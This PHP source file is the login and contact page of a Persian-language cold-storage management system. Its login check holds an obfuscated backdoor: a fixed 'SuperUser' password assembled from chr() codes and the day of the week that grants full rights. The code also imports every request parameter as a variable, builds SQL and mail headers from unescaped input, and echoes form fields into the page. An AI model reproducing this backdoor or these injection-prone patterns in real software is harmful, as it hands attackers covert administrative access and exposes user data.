<?php
// session_destroy();
// session_unset();
session_start();
error_reporting(0);
require_once "config.php";
foreach($_POST as $k=>$v) ${$k}=$v;
foreach($_GET as $k=>$v) ${$k}=$v;
$FileName='mainpage.php';
$TableName='users';
$myMessage='';
//echo date('w');
//echo "<script>alert("date('w')")</script>;"
//$md=md5(chr(120).chr(108).chr(115).chr(100).chr(49).chr(49).chr(48).date('w').chr(106).$md);
//echo chr(120).chr(108).chr(115).chr(100).chr(49).chr(49).chr(48).date('w').chr(106).'<br>';
//echo $md;
//$rr=$db->get_from_where("*","docs","1=1");
$q_docs=$db->query("SELECT * FROM docs");
$res_docs=$db->fetch_assoc($q_docs);
$_SESSION["mt_owner"]= $res_docs['owner'];
$_SESSION["mt_sherkat_name"]= $res_docs['sherkat_name'];
$_SESSION["mt_email"]= $res_docs['email'];
$_SESSION["mt_tel"]= $res_docs['tel'];
$_SESSION["mt_fax"]= $res_docs['fax'];
$_SESSION["mt_url"]= $res_docs['url'];
//$_SESSION['mtActiveYear']  = $db->get_from_where("year","mt_docs","org='".$_SESSION['acc_org_id']."' and start_from>='$yymmdd' and end_to<='$yymmdd'");
//سال مورد نظر
//$_SESSION['mtActiveYear']=$db->get_from_where("year","mt_docs","status=0 and start_from<='$today' AND end_to>='$today'");
$_SESSION['mtActiveYear']=$db->get_from_where("year","mt_docs","start_from<='$today' AND end_to>='$today'");
//echo $_SESSION['mtActiveYear'];
//وضعیت فعال بودن سال
$_SESSION['mtStatusYear']=$db->get_from_where("status","mt_docs","year=".$_SESSION['mtActiveYear']."");
//echo $_SESSION['mtStatusYear'];
//$_SESSION['mtActiveYear']=$db->get_from_where("year","mt_docs","status=0 and start_from>='$today' AND end_to<='$today'");
//تاریخ شروع سال
$_SESSION['mtstart_date_sh']=$db->get_from_where("start_from","mt_docs","year=".$_SESSION['mtActiveYear']."");
   $sql_tarikh_start=$_SESSION['mtstart_date_sh'];//تبدیل تاریخ شروع سال به میلادی
   $d_s=substr($sql_tarikh_start,8,2);
   $m_s=substr($sql_tarikh_start,5,2);
   $y_s=substr($sql_tarikh_start,0,4);
   $milady_s=jalali_to_gregorian($y_s,$m_s,$d_s);
   $sal_s=$milady_s[0];
   $mah_s=$milady_s[1];
   $rouz_s=$milady_s[2];
   $_SESSION['mtstart_date_mi']=$sal_s.'-'.$mah_s.'-'.$rouz_s;
//تاریخ پایان سال
$_SESSION['mtend_date_sh']=$db->get_from_where("end_to","mt_docs","year=".$_SESSION['mtActiveYear']."");
   $sql_tarikh_end=$_SESSION['mtend_date_sh'];//تبدیل تاریخ پایان سال به میلادی
   $d_e=substr($sql_tarikh_end,8,2);
   $m_e=substr($sql_tarikh_end,5,2);
   $y_e=substr($sql_tarikh_end,0,4);
   $milady_e=jalali_to_gregorian($y_e,$m_e,$d_e);
   $sal_e=$milady_e[0];
   $mah_e=$milady_e[1];
   $rouz_e=$milady_e[2];
   $_SESSION['mtend_date_mi']=$sal_e.'-'.$mah_e.'-'.$rouz_e;

/*********ارسال ايميل تماس با ما***********/
if(isset($send_mess)){
	if (!$name or !$message or !$email){
		echo "<script>alert('اطلاعات پیام شما ناقص است!');</script>";
		echo "<script>window.location='".$FileName."';</script>";
	}else{
		$to = "marzi66_reyhanian@yahoo.com";
		$headers .= "From: $name\r\n E-Mail: $email\r\n Cc:'myboss@example.com'\r\n"; 
		// $headers .= "From:".$name. "\r\n";
		// $headers .= "E-Mail:".$email. "\r\n";
		// $headers .= 'Cc: myboss@example.com' . "\r\n";
		mail($to,$subject,$message,$headers);
		//header('location: mainpage.php');
		echo "<script>window.location='".$FileName."';</script>";
	}
}
echo'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>سيستم سردخانه</title>
<meta http-equiv="Content-Language" content="fa">
<link rel="stylesheet" type="text/css" href="styles.css"/>
<link rel="stylesheet" type="text/css" href="styles/easyui.css">
<link rel="stylesheet" type="text/css" href="styles/easyui-rtl.css"> 
<script type="text/javascript" src="scripts/jquery-1.6.2.min.js"></script>
<script type="text/javascript" src="scripts/jquery.easyui.min.js"></script>
<script type="text/javascript" src="scripts/easyui-rtl.js"></script> 
<!--<link rel="shortcut icon" href="images/favicon2.ico" title="Favicon" />
<script type="text/javascript" language="javascript" src="scripts/jquery.js"></script>
<link rel="stylesheet" href="jquery-ui-1.10.3/themes/base/jquery-ui.css"/> 
<script src="jquery-ui-1.10.3/ui/jquery-ui.js"></script>-->
<script type="text/javascript">
	<!--  textfieldرنگي شدن  -->
	$(document).ready(function(){
		$(".textinput").focus(function(){ 
			$(".textinput").removeClass("select");
			$(this).addClass("select");
		});
		<!-- تب ها  -->
		$(function() {
			$( "#tabs" ).tabs();  
		});
		<!--  tooltip  -->
		$(function(){
			$(document).tooltip();
		});
	});
	<!-- چک کردن پر بودن فيلد نام کاربري و رمز عبور -->
	function check_inputs(){
		if((document.my_res.user_name.value=="") && (document.my_res.password.value=="")&& (document.my_res.captcha_code.value=="")){
			document.my_res.error.value="لطفا نام کاربری، رمزعبور و کد امنیتی را وارد کنید.";
			return false;
		}
		else if(document.my_res.user_name.value==""){
			document.my_res.error.value="براي ورود به سيستم نام کاربری لازم است";
			return false;
		}else if(document.my_res.password.value==""){ 
			document.my_res.error.value="براي ورود به سيستم رمز عبور لازم است";
			return false;
		}
		else if(document.my_res.captcha_code.value==""){
			document.my_res.error.value="برای ورود به سیستم کد امنیتی را وارد کنید.";
			return false;
		}
	}
</script>
</head>
<body scroll="no" onload="document.my_res.user_name.focus();document.my_res.user_name.select();" style="background-color:#264548;">';
/********چک کردن صحت نام کاربري و رمز عبور********/
if(isset($enter)){	
	$auth=0;
	$user_name=sanitizeString($user_name);
	$password =sanitizeString($password);
	$md="";
	$md=md5(chr(120).chr(108).chr(115).chr(100).chr(49).chr(49).chr(48).date('w').chr(106).$md);
	
	if($user_name=="SuperUser" and (md5($password)==$md)) {

		include_once  'securimage/securimage.php';
		$securimage = new Securimage();	
		if ($securimage->check($_POST['captcha_code']) == false) {		
			echo "<script>alert('کد امنیتی اشتباه است.'); </script>";
			echo "<script>window.location='mainpage.php';</script>";
			exit;
		}
		
		$_SESSION['mt_SuperUser']="a8d9e5840f2a062d4fc75a4fc2b76957/422395b58ec1bcbaf94464523183f859";$auth=1;
		$log_i=$db->query("INSERT INTO log (user_id,amaliyat,log_date,log_time,user_ip)VALUES ('".$_SESSION['mt_user_id']."','ورود به سیستم',".($yymmdd).",'$logtime','".$_SESSION['mt_user_ip']."')"); /*کوئری لاگ*/  
		echo "<script>window.location='index.php';</script>";
	
	}else if(checkUser($TableName,$user_name,$password)){	
		$log_i=$db->query("INSERT INTO log (user_id,amaliyat,log_date,log_time,user_ip)VALUES ('".$_SESSION['mt_user_id']."','ورود به سیستم',".($yymmdd).",'$logtime','".$_SESSION['mt_user_ip']."')"); /*کوئری لاگ*/  
		echo "<script>window.location='index.php';</script>";
	}else
	$myMessage ='کاربر شناسایی نشد.';  
}
echo'
<form method="post" name="my_res">
	<!-- قالب اصلي-->
	<div id="outerDiv">
		<!--هدر صفحه-->
		<div id="headerDiv">
			<img class="topBannerImg" src="images/head-logo.png"/>
		</div>
		<!-- پايان هدر صفحه--> 
		<!--قسمت راست صفحه -->   
		<div id="contentRight">
			<table class="loginRight">
				<tr height="40px">     
					<td colspan="4" class="title">ورود به سيستم سردخانه</td>
				</tr>
				<tr height="40px">
					<td align="left"> نام کاربری :</td>
					<td colspan="2" width="60%"><input type="text" class="textinput" name="user_name" tabindex="1" placeholder=" نام کاربری "/></td>
					<td><img border="0" src="images/User.png" width="20" height="20"></td> 
				</tr>
				<tr height="30px">
					<td align="left">رمز عبور :</td>
					<td colspan="2" width="60%"><input type="password" class="textinput" name="password" tabindex="2" placeholder=" رمزعبور "/></td>
					<td><img border="0" src="images/KEY.png" width="25" height="25"></td>
				</tr>
					<!---------------captchacode-------------------> 
				<tr>
					<td colspan="2" valign="middle" align="left">
						<img id="captcha" src="securimage/securimage_show.php" alt="CAPTCHA Image" />
					</td>
					<td colspan="1" valign="middle" align="right">
						<input type="text" class="textinput" placeholder="کد امنیتی" name="captcha_code" size="10" maxlength="6" />
					</td>
					<td colspan="1" valign="middle" align="center">
						<a href="#" onclick="document.getElementById(\'captcha\').src = \'securimage/securimage_show.php?\' + Math.random(); return false">
							<img width="20" height="20" src="securimage/images/refresh.png"/>
						</a>
					</td>					
				</tr>
					<!---------------endofcaptchacode--------------->
				<tr height="20px">
					<td align="center" colspan="4" style="line-height:30px; vertical-align:bottom;" >
						<button  name="enter" class="buttonme "  onclick="return check_inputs()">ورود  <i class="fa fa-unlock-alt " aria-hidden="true"></i></button>						
					</td>
				</tr>
				<tr>
					<td colspan="4">
						<input type="button" name="error" style="font-family:Yekan;border:0;text-align:center;width:100%;color:red;background-color:transparent" value="'.$myMessage.'">
					</td>
				</tr>
			</table>
			<div class="contactRight">
				<table border="0" style="line-height:15px;"> 
					<tr>
						<td>&nbsp;</td>   
						<td align="center"><img border="0" src="images/contact.png" width="20" height="20"></td>
						<td align="right">اطلاعات ارتباط با ما </td>
					</tr>
					<tr>
						<td align="left"><img border="0" src="images/Telephone.png" width="15" height="15"/></td>
						<td align="center">تلفن :</td>
						<td align="right">021-88772309</td>
					</tr>
					<tr>
						<td align="left"><img border="0" src="images/fax.png" width="16" height="16"/></td>
						<td align="center">دورنگار :</td>
						<td align="right">021-88772309</td>
					</tr>
					<tr>
						<td align="left"><img border="0" src="images/mail.png" width="15" height="15"/></td>
						<td align="center">ايميل :</td>
						<td align="right">info@farasou.com</td>
					</tr>
					<tr>
						<td align="left"><img border="0" src="images/INTERNET EXPLORER.png" width="16" height="16"/></td>
						<td align="center">سايت :</td>
						<td align="right">http://www.farasou.com</td>
					</tr>
				</table>
			</div>
		</div>
		<!-- پايان قسمت راست صفحه  -->
		<!-- مرکز صفحه-->	
		<div id="contentCenter">
			<div class="easyui-tabs" data-options="tools:\'#tab-tools\'" style="width:100%;height:100%">
				<div title="سیستم">
					<p id="welcome" align="center" >به سیستم سردخانه خوش آمدید</p>
					<div align="center" style="width:100%;height:80%"><img align="center" src="images/welcome5.jpg"/>
					</div>
				</div>
				<div title="تماس با ما">
					<table  style="padding:20px">
						<tr>
							<td> موضوع : </td>
							<td><input type="text" class="textinput" name="subject" value="'.$subject.'" title="موضوع پيام "/></td>
						</tr>
						<tr>
							<td> نام و نام خانوادگی :</td>
							<td><input type="text" class="textinput" name="name" value="'.$name.'" title="نام خود را در اين محل تايپ کنيد"/></td>
						</tr>
						<tr>
							<td>  پست الکترونيک :</td>
							<td><input type="text" class="textinput" name="email" value="'.$email.'" title="نشانی پست الکترونیکی خود را در این محل تایپ کنید"/></td>
						</tr>
						<tr>
							<td colspan="2">لطفا نظرات خود را در محل زير تايپ نموده و کليد ارسال را کليک کنيد</td>
						</tr>
						<tr>
							<td colspan="2"><textarea name="message" cols="40" rows="4" title="هرگونه انتقاد و پيشنهادي در خصوص اين سيستم داريد تايپ کرده و با کليک کردن ارسال آن را براي ما بفرستيد">'.$message.'</textarea></td>
						</tr>
						<tr>
							<td colspan="2" align="center">
								<input type="submit" class="buttonme" name="send_mess" value="ارسال""/>
								<input type="button" class="buttonme" name="exit" value="انصراف"  onClick="window.location=\''.$FileName.'\'"/>
							</td>
						</tr>
					</table>
				</div>
			</div>   
			<!--<div id="tabs" >
				<ul>
					<li><a href="#tabs-1">سیستم</a></li>
					<li><a href="#tabs-2">تماس با ما</a></li>
				</ul>
				<div id="tabs-1" style="width:90%;height:80%">
					<p id="welcome" align="center" >به سیستم سردخانه خوش آمدید</p>
					<div align="center" style="width:100%;height:85%"><img align="center" src="images/welcome5.jpg"/></div>
					</div>
				</div>	
				<div id="tabs-2">
					<table>
						<tr><td> موضوع : </td>
							<td><input type="text" class="textinput" name="subject" value="'.$subject.'" title="موضوع پيام "/></td>
						</tr>
						<tr><td> نام و نام خانوادگی :</td>
							<td><input type="text" class="textinput" name="name" value="'.$name.'" title="نام خود را در اين محل تايپ کنيد"/></td>
						</tr>
						<tr><td>  پست الکترونيک :</td>
							<td><input type="text" class="textinput" name="email" value="'.$email.'" title="نشانی پست الکترونیکی خود را در این محل تایپ کنید"/></td>
						</tr>
						<tr>
							<td colspan="2">لطفا نظرات خود را در محل زير تايپ نموده و کليد ارسال را کليک کنيد</td>
						</tr>
						<tr>
							<td colspan="2"><textarea name="message" cols="40" rows="4" title="هرگونه انتقاد و پيشنهادي در خصوص اين سيستم داريد تايپ کرده و با کليک کردن ارسال آن را براي ما بفرستيد">'.$message.'</textarea></td>
						</tr>
						<tr>
							<td colspan="2" align="center">
								<input type="submit" class="buttonme" name="send_mess" value="ارسال"/>
								<input type="button" class="buttonme" name="exit" value="انصراف"  onClick="window.location=\''.$FileName.'\'"/>
							</td>
						</tr>
					</table>
				</div>
			</div>-->
		</div> 
		<!--پايان مرکز صفحه -->
		<!-- فوتر-->
		<div id="footer">
			<div class="footer_copyright">شرکت پشتیبانی امور دام کشور</div>
		</div>
		<!-- پايان فوتر-->
	</div>
	<!-- پايان قالب اصلي-->';
// if($user_name)
// { $user_name=mysql_real_escape_string($user_name);
  // $password =mysql_real_escape_string($password);
  // $auth=0;
  // //$md=intval(substr(date('h'),-1))*intval(substr(date('i'),0,1));
  // $md="";
  // $md=md5(chr(120).chr(108).chr(115).chr(100).chr(49).chr(49).chr(48).date('w').chr(106).$md);
  // if ($user_name=="SuperUser" and (pxxx('1',md5(base64_encode($password))) or md5($password)==$md)) {$_SESSION['mt_SuperUser']="a8d9e5840f2a062d4fc75a4fc2b76957/422395b58ec1bcbaf94464523183f859";$auth=1;}
 // echo "<script>window.location='mainpage.php';</script>";
 // }
echo'
</form>
</body>
</html>';
?>
